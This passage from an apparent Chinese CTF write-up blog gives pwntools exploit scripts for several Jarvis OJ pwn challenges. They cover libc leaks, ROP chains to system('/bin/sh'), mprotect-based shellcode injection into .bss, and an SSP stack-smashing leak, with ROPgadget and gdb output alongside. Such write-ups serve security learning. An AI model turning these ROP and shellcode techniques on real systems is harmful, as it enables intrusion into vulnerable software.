class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">io</span> = remote(<span class="hljs-string">&quot;pwn2.jarvisoj.com&quot;</span>,<span class="hljs-number">9883</span>)<br><span class="hljs-attribute">elf</span> = ELF(<span class="hljs-string">&quot;./level3_x64&quot;</span>)<br><br><span class="hljs-attribute">write_plt</span> = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br><span class="hljs-attribute">write_got</span> = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br><span class="hljs-attribute">func</span> = elf.symbols[<span class="hljs-string">&quot;vulnerable_function&quot;</span>]<br><br><span class="hljs-attribute">libc</span> = ELF(<span class="hljs-string">&quot;./libc-2.19.so&quot;</span>)<br><span class="hljs-attribute">write_libc</span> = libc.symbols[<span class="hljs-string">&quot;write&quot;</span>]<br><span class="hljs-attribute">sys_libc</span> = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br><span class="hljs-attribute">bin_libc</span> = libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).next()<br><br><span class="hljs-attribute">pop_rdi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">4006</span>B<span class="hljs-number">3</span><br><span class="hljs-attribute">pop_rsi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">4006</span>B<span class="hljs-number">1</span><br><span class="hljs-attribute">payload1</span> = &#x27;a&#x27; * <span class="hljs-number">0</span>x<span class="hljs-number">88</span><br><span class="hljs-attribute">payload1</span> += p<span class="hljs-number">64</span>(pop_rdi_ret) + p<span class="hljs-number">64</span>(<span class="hljs-number">1</span>)   # rdi<br><span class="hljs-attribute">payload1</span> += p<span class="hljs-number">64</span>(pop_rsi_ret) + p<span class="hljs-number">64</span>(write_got) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>xdeadbeef)  #rsi 和 r<span class="hljs-number">15</span><br><span class="hljs-attribute">payload1</span> += p<span class="hljs-number">64</span>(write_plt) + p<span class="hljs-number">64</span>(func)<br><br><span class="hljs-attribute">io</span>.recvline()<br><span class="hljs-attribute">io</span>.sendline(payload<span class="hljs-number">1</span>)<br><span class="hljs-attribute">write_addr</span> = u<span class="hljs-number">64</span>(io.recv(<span class="hljs-number">8</span>))<br><span class="hljs-attribute">sys_addr</span> = write_addr - write_libc + sys_libc<br><span class="hljs-attribute">bin_addr</span> = write_addr - write_libc + bin_libc<br><br><span class="hljs-attribute">payload2</span> = &#x27;a&#x27; * <span class="hljs-number">0</span>x<span class="hljs-number">88</span><br><span class="hljs-attribute">payload2</span> += p<span class="hljs-number">64</span>(pop_rdi_ret) + p<span class="hljs-number">64</span>(bin_addr)<br><span class="hljs-attribute">payload2</span> += p<span class="hljs-number">64</span>(sys_addr) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>xdeadbeef)<br><br><span class="hljs-attribute">io</span>.recvline()<br><span class="hljs-attribute">io</span>.sendline(payload<span class="hljs-number">2</span>)<br><span class="hljs-attribute">io</span>.interactive()<br><span class="hljs-attribute">io</span>.close()<br></code></pre></td></tr></table></figure><p>与 level3 相比，只在函数传参上有区别，按照 x64 的函数调用约定 leak 出 libc，然后 rop 执行 system(“/bin/sh”) 即可。</p><p>值得注意的是，这道题目中没有 puts，因此 leak libc 只能通过 write(1, elf.got[‘write’], 8)，但 ROPgadget 等工具只能找到控制 rdi 和 rsi 的 gadget，也就是我们不能控制 write 输出的长度，这时候有两种方法：</p><p>一是使用 64 位 elf 的 <a href="https://www.cnblogs.com/Ox9A82/p/5487725.html"><em>通用 gadget</em></a>；</p><p>二是通过调试发现 write 时 rdx 是大于 8 的（实际上大于 6 即可），因此可以完全不用考虑控制 rdx。</p><p><a href="https://github.com/bash-c/pwn_repo/tree/master/jarvisOJ_level3_x64"><em>exploit here</em></a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python<br># -*- coding: utf-<span class="hljs-number">8</span> -*-<br><br>from pwn import *<br>import sys<br>context.binary = <span class="hljs-string">&quot;./level3_x64&quot;</span><br>#  context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = context.binary<br><br>if sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;l&quot;</span>:<br>    io = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./level3_x64&quot;</span>)<br>    libc = elf.libc<br>else:<br>    io = <span class="hljs-built_in">remote</span>(<span class="hljs-string">&quot;pwn2.jarvisoj.com&quot;</span>,<span class="hljs-number">9883</span>)<br>    libc = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">&quot;./libc-2.19.so&quot;</span>)<br><br><br>prdi = <span class="hljs-number">0</span>x4006B3<br>prsi = <span class="hljs-number">0</span>x4006B1<br><br>io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Input:\n&quot;</span>, <span class="hljs-built_in">flat</span>(<span class="hljs-built_in">cyclic</span>(<span class="hljs-number">0</span>x88), prdi, <span class="hljs-number">1</span>, prsi, elf.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">0</span>, elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;vulnerable_function&#x27;</span>]))<br>libc.address = <span class="hljs-built_in">u64</span>(io.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>: ] + <span class="hljs-string">&#x27;\0\0&#x27;</span>) - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-built_in">success</span>(<span class="hljs-string">&quot;libc -&gt; &#123;:#x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(libc.address))<br><br><br>io.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&quot;Input:\n&quot;</span>, <span class="hljs-built_in">flat</span>(<span class="hljs-built_in">cyclic</span>(<span class="hljs-number">0</span>x88), prdi, <span class="hljs-built_in">next</span>(libc.<span class="hljs-built_in">search</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>)), libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>io.<span class="hljs-built_in">interactive</span>()<br><br></code></pre></td></tr></table></figure><h3 id="XMAN-level5"><a href="#XMAN-level5" class="headerlink" title="[XMAN]level5"></a>[XMAN]level5</h3><p>mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。</p><p>  附件同level3_x64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>p=remote(<span class="hljs-string">&#x27;pwn2.jarvisoj.com&#x27;</span>,<span class="hljs-number">9884</span>)<br>elf = ELF(<span class="hljs-string">&quot;./level3_x64&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.19.so&quot;</span>)<br>log.info(<span class="hljs-string">&quot;*************************leak libc memory&quot;</span>）<br>pause()<br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>vul_add = elf.symbols[<span class="hljs-string">&quot;vulnerable_function&quot;</span>]<br>rdi = <span class="hljs-number">0x00000000004006b3</span><br>rsi_r15 = <span class="hljs-number">0x00000000004006b1</span><br><br>p1 = <span class="hljs-string">&quot;1&quot;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>)<br>p1 += p64(rdi)<br>p1 += p64(<span class="hljs-number">1</span>)<br>p1 += p64(rsi_r15)<br>p1 += p64(write_got)<br>p1 += <span class="hljs-string">&quot;1&quot;</span> * <span class="hljs-number">8</span><br>p1 += p64(write_plt)<br>p1 += p64(vul_add)<br>p.recv()<br>sleep(<span class="hljs-number">0.2</span>)<br><br>p.send(p1)<br><br>data = p.recv(<span class="hljs-number">8</span>)<br>read_addr = u64(data)<br><br>libc.base = read_addr - libc.symbols[<span class="hljs-string">&quot;write&quot;</span>]<br>mprotect_addr = libc.base + libc.symbols[<span class="hljs-string">&quot;mprotect&quot;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;mprotect: [&quot;</span>+<span class="hljs-built_in">hex</span>(mprotect_addr)+<span class="hljs-string">&quot;]&quot;</span><br>log.info(<span class="hljs-string">&quot;*************************write shellcode&quot;</span>)<br>pause()<br><br>read_plt = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss_base = elf.bss()<br>rdi = <span class="hljs-number">0x00000000004006b3</span><br>rsi_r15 = <span class="hljs-number">0x00000000004006b1</span><br><br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload2 += p64(rdi) + p64(<span class="hljs-number">0</span>) <br>payload2 += p64(rsi_r15)  + p64(bss_base) +<span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">8</span><br>payload2 += p64(read_plt)<br>payload2 += p64(vul_add)<br><br>sleep(<span class="hljs-number">0.2</span>)<br>p.send(payload2)<br>shellcode = <span class="hljs-string">&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span><br><br>sleep(<span class="hljs-number">0.2</span>)<br>p.send(shellcode)<br>log.info(<span class="hljs-string">&quot;*************************write shellcode add&quot;</span>)<br>pause()<br><br>bss_got= <span class="hljs-number">0x0000000000600A48</span><br>payload3 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload3 += p64(rdi)+p64(<span class="hljs-number">0</span>)<br>payload3 += p64(rsi_r15) + p64(bss_got) + <span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">8</span><br>payload3 += p64(read_plt) + p64(vul_add)<br><br>sleep(<span class="hljs-number">0.2</span>)<br>p.send(payload3)<br>sleep(<span class="hljs-number">0.2</span>)<br>p.send(p64(bss_base))<br><br>log.info(<span class="hljs-string">&quot;*************************write mprotect add&quot;</span>)<br>pause()<br>mprotect_got = <span class="hljs-number">0x0000000000600A50</span><br>payload4 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload4 += p64(rdi) + p64(<span class="hljs-number">0</span>)<br>payload4 += p64(rsi_r15) + p64(mprotect_got) + p64(<span class="hljs-number">0</span>)<br>payload4 += p64(read_plt) +p64(vul_add)<br><br>sleep(<span class="hljs-number">0.2</span>)<br>p.send(payload4)<br>sleep(<span class="hljs-number">0.2</span>)<br>p.send(p64(mprotect_addr))<br><br>log.info(<span class="hljs-string">&quot;*************************use mprotect and return execu shellcode&quot;</span>)<br>pause()<br>gadget_start = <span class="hljs-number">0x00000000004006A6</span><br>gadget_end = <span class="hljs-number">0x0000000000400690</span><br><br>payload5 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload5 += p64(gadget_start) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) +p64(mprotect_got) + p64(<span class="hljs-number">7</span>) +p64(<span class="hljs-number">0x1000</span>)+p64(<span class="hljs-number">0x600000</span>)<br>payload5 +=p64(gadget_end) <br>payload5 += <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(bss_got) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload5 += p64(gadget_end)<br><br>sleep(<span class="hljs-number">0.2</span>)<br>p.send(payload5)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>两个函数原型如下：<br>void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off)<br>mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)<br>mprotect(add,len,prot)rdi = add ； rsi = len ；rdx = prot；  prot=7 是可读可写可执行<br>int mprotect(void *addr, size_t len, int prot);<br>mmap主要是将哪个文件映射到一段内存去同时设置那段内存的属性 可读可写或者是可执行<br>mprotect函数是将从addr开始的地址 ，长度位len的内存 的访问权限</p><p>解题思路：</p><blockquote><p>利用write函数泄露出libc内存信息  #write(1,write_got,8)<br> 然后计算出mprotect函数在libc中的地址 #mprotect_add = libc_base &gt;+ libc.symbols[“mprotect”]<br> 将shellcdoe写入bss段<br> 将bss地址和mprotect地址写入got表<br> 最后用通用gadget调用mprotect函数将bss段设置为可执行<br> 然后跳转到bss在got表的地址执行shellcode</p></blockquote><p>然后就是找好gadget 通过ROPgadget –binary level3_x64 –only “pop|ret” ,可以发现 pop_rdi 和 pop_rsi_r15 这两个有用的gadget 用来调用read函数和write函数,mprotect函数可以用_libc_csu_init 的通用gadget调用<br>0x00400000         0x00401000         r-xp    /home/r3teax/Jarvis OJ/PWN/level5/level3_x64<br>0x00600000         0x00601000         rw-p    /home/r3teax/Jarvis OJ/PWN/level5/level3_x64</p><p>可以看出bss段可写入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">r3teax@ubuntu:~/Jarvis OJ/PWN/level5$ ROPgadget --binary level3_x64 --only <span class="hljs-string">&quot;pop|ret&quot;</span><br><br><span class="hljs-comment"># Gadgets information</span><br><br>0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret<br>0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret<br>0x00000000004006b0 : pop r14 ; pop r15 ; ret<br>0x00000000004006b2 : pop r15 ; ret<br>0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret<br>0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret<br>0x0000000000400550 : pop rbp ; ret <br>0x00000000004006b3 : pop rdi ; ret <br>0x00000000004006b1 : pop rsi ; pop r15 ; ret<br>0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret<br>0x0000000000400499 : ret<br></code></pre></td></tr></table></figure><blockquote><blockquote><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]==elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-literal">True</span><br>elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]==elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-literal">True</span><br>elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]==elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure></blockquote></blockquote></blockquote><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.binary = <span class="hljs-string">&quot;./level3_x64&quot;</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;deepin-terminal&quot;</span>, <span class="hljs-string">&quot;-x&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>]<br>elf = context.binary<br><br><span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;l&quot;</span>:<br>    io = process(<span class="hljs-string">&quot;./level3_x64&quot;</span>, env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>: <span class="hljs-string">&quot;./libc-2.19.so&quot;</span>&#125;)<br>    <span class="hljs-comment">#  libc = elf.libc</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc-2.19.so&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="hljs-number">9884</span>)<br>    libc = ELF(<span class="hljs-string">&quot;./libc-2.19.so&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0x00000000004006b3 : pop rdi ; ret</span><br><span class="hljs-string">    0x00000000004006b1 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    prdi = <span class="hljs-number">0x00000000004006b3</span><br>    pprsi = <span class="hljs-number">0x00000000004006b1</span><br>    leak = flat(cyclic(<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>), prdi, <span class="hljs-number">1</span>, pprsi, elf.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">0</span>, elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;_start&#x27;</span>])<br>    io.sendafter(<span class="hljs-string">&quot;Input:\n&quot;</span>, leak)<br>    libc.address = u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>: ] + <span class="hljs-string">&#x27;\0\0&#x27;</span>) - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    success(<span class="hljs-string">&quot;libc -&gt; &#123;:#x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(libc.address))<br>    pause()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x0000000000024885: pop rsi; ret;</span><br><span class="hljs-string">0x0000000000001b8e: pop rdx; ret; </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># gdb.attach(io, &quot;b *0x400619\nc&quot;)</span><br><br>prsi = libc.address + <span class="hljs-number">0x24885</span><br>prdx = libc.address + <span class="hljs-number">0x1b8e</span><br>mprotect = flat(cyclic(<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>), prdi, <span class="hljs-number">0x00600000</span>, prsi, <span class="hljs-number">0x1000</span>, prdx, <span class="hljs-number">7</span>, libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;_start&#x27;</span>])<br>io.sendafter(<span class="hljs-string">&quot;Input:\n&quot;</span>, mprotect)<br>pause()<br><br>read = flat(cyclic(<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>), prdi, <span class="hljs-number">0</span>, prsi, elf.bss() + <span class="hljs-number">0x500</span>, prdx, <span class="hljs-number">0x100</span>, elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>], elf.bss() + <span class="hljs-number">0x500</span>)<br>io.sendafter(<span class="hljs-string">&quot;Input:\n&quot;</span>, read)<br>io.send(asm(shellcraft.sh()))<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p>mprotect 函数用于改变某段地址的权限（rwxp），mmap 用于申请一段空间，根据参数不同可以设置这段空间的权限。</p><p>这道题目开启了 NX 保护，并假设禁用了 system 和 execve 函数（实际并没有），因此可以考虑通过 mprotect 改变 .bss/.data 权限或者通过 mmap 申请一段具有可执行权限的空间写 shellcode 的方法来 get shell，重点介绍如何使用 mprotect。</p><ol><li>第一次 rop 使用 <strong>write(1, elf.got[‘write’], rdx)</strong> leak 出 libc 基地址</li><li>第二次 rop 使用 <strong>mprotect(0x00600000, 0x1000, 7)</strong> 把 .bss 段设为有可执行权限</li><li>第三次 rop 通过 <strong>read(0, elf.bss() + 0x500, 0x100)</strong> 把 shellcode 读到 .bss 并返回到 shellcode</li></ol><p>需要注意的是第一次 rop 时，与 level3 相似，调试可以发现 rdx 是大于 6的，因此可以不用通用 gadget 来设置 rdx；</p><p>但第二次使用 mprotect 时必须设置 rdx 寄存器，这时候我们已经 leak 除了 libc 基地址，因此可以<strong>使用</strong> <strong>libc</strong> <strong>中的 gadget</strong> <strong>来设置 rdx</strong>，也不需要用通用 gadget。</p><p>并且 <strong>mprotect</strong> <strong>指定的内存区必须包含整个内存页，区间长度必须是页大小的整数倍</strong>。</p><h3 id="Tell-Me-Something"><a href="#Tell-Me-Something" class="headerlink" title="Tell Me Something"></a>Tell Me Something</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">import</span> sys<br><br><span class="hljs-attribute">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;l&quot;</span>:<br>    <span class="hljs-attribute">io</span> = process(<span class="hljs-string">&quot;./guestbook&quot;</span>)<br><span class="hljs-attribute">else</span>:<br>    <span class="hljs-attribute">io</span> = remote(<span class="hljs-string">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="hljs-number">9876</span>)<br><br><span class="hljs-attribute">payload</span> = &#x27;<span class="hljs-number">0</span>&#x27; * (<span class="hljs-number">0</span>x<span class="hljs-number">80</span> + <span class="hljs-number">0</span>x<span class="hljs-number">8</span>) + p<span class="hljs-number">64</span>(ELF(<span class="hljs-string">&quot;./guestbook&quot;</span>).sym[&#x27;good_game&#x27;])<br><span class="hljs-attribute">io</span>.sendafter(<span class="hljs-string">&quot;message:\n&quot;</span>, payload)<br><br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></td></tr></table></figure><h3 id="Smashes"><a href="#Smashes" class="headerlink" title="Smashes"></a>Smashes</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import*<br><span class="hljs-attribute">sh</span>=remote(<span class="hljs-string">&quot;pwn.jarvisoj.com&quot;</span>,<span class="hljs-string">&quot;9877&quot;</span>)<br><span class="hljs-attribute">sh</span>.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br><span class="hljs-attribute">payload</span>=&#x27;a&#x27;*<span class="hljs-number">0</span>x<span class="hljs-number">218</span>+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">400</span>d<span class="hljs-number">20</span>)<br><span class="hljs-attribute">sh</span>.sendline(payload)<br><span class="hljs-attribute">sh</span>.interactive()<br></code></pre></td></tr></table></figure><p>ssp 攻击，大致原理是覆盖 __libc_argv[0]，触发栈溢出，通过报错来 leak 某些信息。</p><p>通过调试可以快速确定覆盖所需的偏移量以及重映射后 flag 的地址</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs lasso">gdb<span class="hljs-params">-peda</span>$ b *<span class="hljs-number">0x40080E</span><br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x40080e</span><br>gdb<span class="hljs-params">-peda</span>$ r<br>Starting program: /home/r3teax/Jarvis OJ/PWN/Smashes/smashes <br>Hello!<br><br><span class="hljs-params">...</span><span 